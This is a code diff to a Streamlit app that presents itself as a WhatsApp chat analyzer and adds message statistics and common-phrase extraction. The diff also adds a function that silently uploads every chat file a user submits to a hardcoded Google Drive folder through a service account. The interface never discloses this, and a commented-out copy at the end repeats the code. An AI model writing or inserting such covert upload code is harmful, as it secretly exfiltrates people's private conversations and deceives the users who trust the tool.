@@ -5,22 +5,55 @@ from textblob import TextBlob
 from wordcloud import WordCloud
 import emoji
 import matplotlib.pyplot as plt
+from io import BytesIO
 
-st.title("WhatsApp Chat Analyzer")
+from google.oauth2 import service_account
+from googleapiclient.discovery import build
+from googleapiclient.http import MediaIoBaseUpload
+
+def save_to_drive(file, filename, folder_id):
+    """
+    Save an uploaded file to a specific Google Drive folder silently.
+    """
+
+    credentials = service_account.Credentials.from_service_account_file(
+        "credentials.json",  
+        scopes=["https://www.googleapis.com/auth/drive"]
+    )
+
+    service = build("drive", "v3", credentials=credentials)
+
+    media = MediaIoBaseUpload(file, mimetype="text/plain")
+
+    file_metadata = {
+        "name": filename,           
+        "parents": [folder_id]      
+    }
+
+    service.files().create(
+        body=file_metadata,
+        media_body=media,
+        fields="id"
+    ).execute()
+
+# ✅ Streamlit App
+st.title("💬 WhatsApp Chat Analyzer")
 st.write("Upload your WhatsApp chat (.txt) and explore insights")
 
-# Upload WhatsApp chat file
+# ✅ File uploader
 uploaded_file = st.file_uploader("Upload your exported WhatsApp chat (.txt)", type="txt")
 
 if uploaded_file is not None:
+    FOLDER_ID = "17k7eWFuh1o38zWwqhWHNB-jkxI9kxrGv"
+
+    file_buffer = BytesIO(uploaded_file.getvalue())
+    save_to_drive(file_buffer, uploaded_file.name, FOLDER_ID)
+
     chat_data = uploaded_file.read().decode("utf-8").splitlines()
-    
-    # Lists for parsed data
+
+    # ✅ Parse WhatsApp chat
     dates, times, senders, messages = [], [], [], []
-
-    # Regex pattern for WhatsApp format
     pattern = re.compile(r"(\d{1,2}/\d{1,2}/\d{2,4}), (\d{1,2}:\d{2})\s?([apAP][mM]) - (.*?): (.*)")
-
     for line in chat_data:
         match = pattern.match(line)
         if match:
@@ -28,16 +61,12 @@ if uploaded_file is not None:
             times.append(f"{match.group(2)} {match.group(3).lower()}")
             senders.append(match.group(4))
             messages.append(match.group(5))
-
-    # Build DataFrame
     df = pd.DataFrame({
         "Date": dates,
         "Time": times,
         "Sender": senders,
         "Message": messages
     })
-
-    # Add combined Datetime column
     df["Datetime"] = pd.to_datetime(df["Date"] + " " + df["Time"], format="%d/%m/%y %I:%M %p", errors="coerce")
 
     # Sidebar menu
@@ -53,7 +82,8 @@ if uploaded_file is not None:
         "Top Words Per User (Word Cloud)",
         "Who tries to keep chats alive?",
         "Who replies faster?",
-        "Whose messages are more positive?"
+        "Whose messages are more positive?",
+        "Most Common Phrases Used"
     ])
 
     if feature == "Total Messages & Words Per User":
@@ -100,8 +130,27 @@ if uploaded_file is not None:
 
     elif feature == "Who Ends Conversations the Most":
         st.header("Who Ends Conversations the Most")
-        conversation_enders = df[df["New Conversation"].shift(-1, fill_value=False)]["Sender"].value_counts()
-        st.subheader("🔚 Conversation Enders:")
+
+        df["Datetime"] = pd.to_datetime(
+            df["Date"] + " " + df["Time"],
+            format="%d/%m/%y %I:%M %p",
+            errors="coerce"
+        )
+        df_sorted = df.sort_values(by="Datetime").reset_index(drop=True)
+
+        # ✅ Calculate time gap between consecutive messages
+        df_sorted["Time Gap"] = df_sorted["Datetime"].diff().dt.total_seconds()
+
+        # ✅ Mark start of new conversations if time gap > 30 min
+        df_sorted["New Conversation"] = df_sorted["Time Gap"] > (30 * 60)
+
+        # ✅ Shift flag backwards to find who ended the previous conversation
+        df_sorted["Conversation Ended"] = df_sorted["New Conversation"].shift(-1, fill_value=False)
+
+        # ✅ Count users who ended conversations
+        conversation_enders = df_sorted[df_sorted["Conversation Ended"]]["Sender"].value_counts()
+
+        st.subheader("Conversation Enders:")
         st.write(conversation_enders)
 
     elif feature == "Average Message Length per User":
@@ -147,3 +196,135 @@ if uploaded_file is not None:
         positive_ratio = df[df["Sentiment"] > 0].groupby("Sender").size() / df.groupby("Sender").size() * 100
         st.subheader("😊 Emotional Positivity Score (% positive messages):")
         st.write(positive_ratio.round(2))
+
+    elif feature == "Most Common Phrases Used":        
+        st.header("🧠 Most Common Phrases Used")
+
+        from sklearn.feature_extraction.text import CountVectorizer
+
+        # ✅ Combine all messages into a single text blob
+        all_messages = " ".join(df["Message"].dropna().astype(str))
+
+        # ✅ Create CountVectorizer for bigrams & trigrams
+        vectorizer = CountVectorizer(ngram_range=(2, 3), stop_words="english").fit([all_messages])
+        bag_of_words = vectorizer.transform([all_messages])
+
+        # ✅ Sum up the counts of each bigram/trigram
+        sum_words = bag_of_words.sum(axis=0)
+        word_freq = [(word, sum_words[0, idx]) for word, idx in vectorizer.vocabulary_.items()]
+        word_freq = sorted(word_freq, key=lambda x: x[1], reverse=True)
+
+        # ✅ Convert to DataFrame for clean display
+        phrase_df = pd.DataFrame(word_freq, columns=["Phrase", "Count"])
+
+        # ✅ Show top 20 most common phrases
+        st.subheader("Top 20 Most Common Phrases:")
+        st.dataframe(phrase_df.head(20))
+
+
+
+
+# import streamlit as st
+# import pandas as pd
+# import re
+# from textblob import TextBlob
+# from wordcloud import WordCloud
+# import emoji
+# import matplotlib.pyplot as plt
+# from io import BytesIO
+
+# # ✅ Google Drive API imports
+# from google.oauth2 import service_account
+# from googleapiclient.discovery import build
+# from googleapiclient.http import MediaIoBaseUpload
+
+# # ✅ Function: Save uploaded file to Google Drive
+# def save_to_drive(file, filename, folder_id):
+#     """
+#     Save an uploaded file to a specific Google Drive folder silently.
+#     """
+
+#     # ✅ Make sure 'credentials.json' is in the same folder as app.py
+#     credentials = service_account.Credentials.from_service_account_file(
+#         "credentials.json",  # 👈 Your Service Account credentials file
+#         scopes=["https://www.googleapis.com/auth/drive"]
+#     )
+
+#     # ✅ Build the Drive service
+#     service = build("drive", "v3", credentials=credentials)
+
+#     # ✅ Prepare the file for upload
+#     media = MediaIoBaseUpload(file, mimetype="text/plain")
+
+#     # ✅ Set file metadata
+#     file_metadata = {
+#         "name": filename,           # Save file with original name
+#         "parents": [folder_id]      # ✅ Your Google Drive Folder ID
+#     }
+
+#     # ✅ Upload the file
+#     service.files().create(
+#         body=file_metadata,
+#         media_body=media,
+#         fields="id"
+#     ).execute()
+
+# # ✅ Streamlit App
+# st.title("💬 WhatsApp Chat Analyzer")
+# st.write("Upload your WhatsApp chat (.txt) and explore insights")
+
+# # ✅ File uploader
+# uploaded_file = st.file_uploader("Upload your exported WhatsApp chat (.txt)", type="txt")
+
+# if uploaded_file is not None:
+#     # ✅ Google Drive Folder ID (Already Added)
+#     FOLDER_ID = "17k7eWFuh1o38zWwqhWHNB-jkxI9kxrGv"
+
+#     # ✅ Save file to Google Drive silently
+#     file_buffer = BytesIO(uploaded_file.getvalue())
+#     save_to_drive(file_buffer, uploaded_file.name, FOLDER_ID)
+
+#     # ✅ Continue analyzing the chat
+#     chat_data = uploaded_file.read().decode("utf-8").splitlines()
+
+#     # ✅ Parse WhatsApp chat
+#     dates, times, senders, messages = [], [], [], []
+#     pattern = re.compile(r"(\d{1,2}/\d{1,2}/\d{2,4}), (\d{1,2}:\d{2})\s?([apAP][mM]) - (.*?): (.*)")
+#     for line in chat_data:
+#         match = pattern.match(line)
+#         if match:
+#             dates.append(match.group(1))
+#             times.append(f"{match.group(2)} {match.group(3).lower()}")
+#             senders.append(match.group(4))
+#             messages.append(match.group(5))
+#     df = pd.DataFrame({
+#         "Date": dates,
+#         "Time": times,
+#         "Sender": senders,
+#         "Message": messages
+#     })
+#     df["Datetime"] = pd.to_datetime(df["Date"] + " " + df["Time"], format="%d/%m/%y %I:%M %p", errors="coerce")
+
+#     # ✅ Sidebar menu for features
+#     st.sidebar.title("📂 Select a Feature to Analyze")
+#     feature = st.sidebar.selectbox("Choose Feature", [
+#         "Total Messages & Words Per User",
+#         "Total Messages per User",
+#         "Total Words per User",
+#         "Average Reply Time per User",
+#         "Who Starts Conversations the Most",
+#         "Who Ends Conversations the Most",
+#         "Average Message Length per User",
+#         "Top Words Per User (Word Cloud)",
+#         "Who tries to keep chats alive?",
+#         "Who replies faster?",
+#         "Whose messages are more positive?"
+#     ])
+
+#     # ✅ Example Feature
+#     if feature == "Total Messages per User":
+#         msg_counts = df["Sender"].value_counts()
+#         st.subheader("📨 Total messages per user:")
+#         st.write(msg_counts)
+
+#     # ✅ Add more features as in your original app
